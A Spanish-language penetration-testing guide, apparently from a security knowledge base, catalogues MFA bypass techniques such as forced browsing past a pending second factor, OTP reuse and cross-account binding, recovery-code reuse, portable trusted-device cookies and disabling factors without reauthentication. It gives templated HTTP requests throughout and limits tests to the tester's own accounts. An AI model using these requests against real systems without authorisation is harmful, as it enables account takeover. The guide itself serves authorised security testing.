# 🗡️ Bypass de MFA: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 📚 Banco ampliado de payloads

[Abrir el catálogo por técnica y los diccionarios de PayloadsAllTheThings](Catalogo_PATT.md). Los bloques de esta guía explican las pruebas iniciales; el catálogo reúne variantes adicionales por motor, parser y contexto.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Rutas privadas con MFA pendiente

```text
GET /api/me
GET /api/account/settings
GET /api/profile
GET /api/security/factors
GET /api/orders/{ID_PROPIO}
```

**Cuándo usarlo:** Usar la cookie propia tras validar contraseña y antes del segundo factor. Comparar con cookie anónima y sesión plenamente autenticada.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/authentication/multi-factor).


### Campos y formatos del código OTP

```text
otp={OTP_PROPIO_CORRECTO}
otp={OTP_PROPIO_ANTERIOR}
code={OTP_PROPIO_CORRECTO}
verificationCode={OTP_PROPIO_CORRECTO}
totp={OTP_PROPIO_CORRECTO}
```

**Cuándo usarlo:** Identificar el campo real antes de variar. Un código incorrecto rechazado no demuestra nada; comprobar expiración, uso único y vinculación a la sesión propia sin fuerza bruta.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/authentication/multi-factor).


## 🧭 Payloads por contexto

### Recuperación y dispositivo recordado

```text
POST /mfa/verify  code={CODIGO_RECUPERACION_PROPIO}
POST /mfa/verify  code={CODIGO_RECUPERACION_YA_USADO}
GET /account      Cookie: trusted_device={COOKIE_PROPIA}
GET /account      Cookie: trusted_device={COOKIE_DE_OTRA_SESION_PROPIA}
```

**Cuándo usarlo:** Usar códigos de recuperación propios. Un código consumido debe rechazarse; la cookie de dispositivo debe vincularse a cuenta, navegador y política de caducidad.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/mfa-bypass.md).


### Gestión de factores

```text
GET /api/mfa/factors
POST /api/mfa/enroll
POST /api/mfa/disable
POST /api/mfa/recovery-codes
POST /api/account/change-email
```

**Cuándo usarlo:** Adaptar solo rutas existentes y probar cambios reversibles en una cuenta propia. Una operación sensible debe exigir el nivel de autenticación indicado por el producto.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/authentication/multi-factor).


## 🔥 Payloads avanzados

### Cambio de flujo y estado intermedio

```text
POST /login -> session={PRE_MFA_A} -> GET /api/me
POST /login -> session={PRE_MFA_A} -> GET /api/security/factors
POST /mfa/verify -> session={POST_MFA_A} -> GET /api/me
POST /mfa/verify -> session={POST_MFA_A} -> GET /api/security/factors
```

**Cuándo usarlo:** Comparar el mismo recurso a ambos lados de la transición. Solo hay bypass si una cookie de pre-MFA permite una función que exige MFA.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/authentication/multi-factor).


### Vinculación de desafío OTP

```text
challenge_id={DESAFIO_A}&code={CODIGO_A}
challenge_id={DESAFIO_A}&code={CODIGO_B}
challenge_id={DESAFIO_B}&code={CODIGO_A}
challenge_id={DESAFIO_A}&code={CODIGO_A_YA_USADO}
```

**Cuándo usarlo:** Dos desafíos y factores de prueba bajo tu control. La aceptación cruzada puede indicar ausencia de vinculación; nunca usar códigos de terceros.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/mfa-bypass.md).


## 🔬 Pruebas guiadas por escenario

### 1. Forced browsing antes del OTP

**Objetivo:** Con contraseña propia válida y MFA pendiente, pedir la ruta final directamente.

```http
GET /my-account HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_MFA_PENDIENTE}
```

**Interpretación:** Confirmar datos o acciones protegidas, no solo un 200 de una pantalla vacía.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/mfa-bypass.md).

### 2. Endpoint API alternativo

**Objetivo:** Comparar la UI MFA con la API que alimenta la cuenta bajo la misma sesión pendiente.

```http
GET /api/v1/me HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_MFA_PENDIENTE}
```

**Interpretación:** Una UI bloqueada y una API con datos privados muestran enforcement inconsistente.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/authentication/multi-factor).

### 3. OTP de cuenta B en flujo A

**Objetivo:** Usar dos cuentas propias para comprobar vinculación de código a usuario y transacción.

```http
POST /mfa/verify HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_A_MFA_PENDIENTE}
Content-Type: application/x-www-form-urlencoded

code={OTP_ACTUAL_DE_B}
```

**Interpretación:** Si A avanza, confirmar identidad y estado final. Los OTP de terceros quedan fuera.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/authentication/multi-factor).

### 4. OTP reutilizado

**Objetivo:** Usar por segunda vez un código propio ya consumido.

```http
POST /mfa/verify HTTP/1.1
Host: {ORIGEN}
Cookie: session={NUEVA_SESION_A_MFA_PENDIENTE}
Content-Type: application/x-www-form-urlencoded

code={OTP_PROPIO_YA_CONSUMIDO}
```

**Interpretación:** Distinguir TOTP aún vigente de código de un solo uso si el producto promete consumo único.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/mfa-bypass.md).

### 5. Valor vacío y tipo inesperado

**Objetivo:** Comparar rechazo de código vacío, null o estructura, una variación por request.

```json
{"otp":null}
```

**Interpretación:** El servidor debe validar tipo y presencia. Un error 500 es pista de manejo débil, no bypass por sí solo.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/mfa-bypass.md).

### 6. Código de respaldo

**Objetivo:** Probar consumo único de un recovery code emitido a la propia cuenta.

```http
POST /mfa/recovery HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_A_MFA_PENDIENTE}
Content-Type: application/x-www-form-urlencoded

code={CODIGO_RESCATE_PROPIO_YA_USADO}
```

**Interpretación:** El segundo uso debe fallar; guardar el código solo localmente y eliminarlo de la evidencia.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/mfa-bypass.md).

### 7. Remember device en navegador distinto

**Objetivo:** Reutilizar un token propio de dispositivo confiable en otro perfil controlado.

```http
GET /my-account HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_A_MFA_PENDIENTE}; trusted_device={TOKEN_DISPOSITIVO_PROPIO}
```

**Interpretación:** Documentar si está ligado a cuenta, dispositivo, expiración y revocación; un cookie portátil puede ser diseño débil.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/authentication/multi-factor).

### 8. Cambio de contraseña y factor

**Objetivo:** Usar recuperación de la cuenta propia y revisar si crea una sesión plenamente verificada.

```http
GET /api/security/settings HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_TRAS_RESET_PROPIO}
```

**Interpretación:** Solo hay bypass si el reset permite acciones protegidas por MFA sin segundo factor equivalente.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/mfa-bypass.md).

### 9. Sesión anterior al activar MFA

**Objetivo:** Comparar sesiones propias abiertas antes y después de activar MFA.

```http
GET /api/security/settings HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_ANTERIOR_A_ACTIVAR_MFA}
```

**Interpretación:** Revisar política de revocación; puede requerir invalidar sesiones viejas al activar factor.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/mfa-bypass.md).

### 10. OTP expuesto en respuesta

**Objetivo:** Inspeccionar la respuesta de envío de OTP de la propia cuenta antes de completar el factor.

```http
POST /mfa/send HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_A_MFA_PENDIENTE}
Content-Type: application/json

{"method":"email"}
```

**Interpretación:** Solo hay bypass práctico si la respuesta accesible al mismo estado pendiente contiene el OTP o un valor equivalente.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/mfa-bypass.md).

### 11. Límite de intentos del OTP

**Objetivo:** Enviar tres códigos inválidos a una sesión MFA propia para observar contador y ventana.

```text
POST /mfa/verify code=000001
POST /mfa/verify code=000002
POST /mfa/verify code=000003
Misma cuenta y misma transacción propias; registrar bloqueo y Retry-After.
```

**Interpretación:** No inferir ausencia de límite por tres rechazos: cuantificar política anunciada sin fuerza bruta ni cuentas ajenas.

**Fuente técnica:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html).

### 12. Desactivación de MFA sin prueba reciente

**Objetivo:** Bajo una cuenta propia ya autenticada, omitir OTP o reautenticación al desactivar el factor.

```http
POST /api/mfa/disable HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_A}
Content-Type: application/json

{}
```

**Interpretación:** Confirmar que el factor se desactivó, y restaurarlo. Un 200 sin cambio de estado no establece bypass.

**Fuente técnica:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html).

### 13. Cambio de factor sin factor anterior

**Objetivo:** Solo si existe una función de reemplazo, pedir cambio hacia un canal propio sin confirmar el factor vigente.

```http
POST /api/mfa/change-phone HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_A}
Content-Type: application/json

{"newPhone":"{TELEFONO_PROPIO_NUEVO}"}
```

**Interpretación:** Distinguir solicitud pendiente de factor efectivamente reemplazado; verificar desde la cuenta A y revertir.

**Fuente técnica:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html).

### 14. Activación TOTP sin código de confirmación

**Objetivo:** Tras iniciar el alta propia de TOTP, omitir el paso que prueba posesión del nuevo secreto.

```http
POST /api/mfa/totp/activate HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_A}
Content-Type: application/json

{}
```

**Interpretación:** El factor no debería quedar activo sin código del autenticador; confirmar configuración persistida y capacidad de login.

**Fuente técnica:** [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
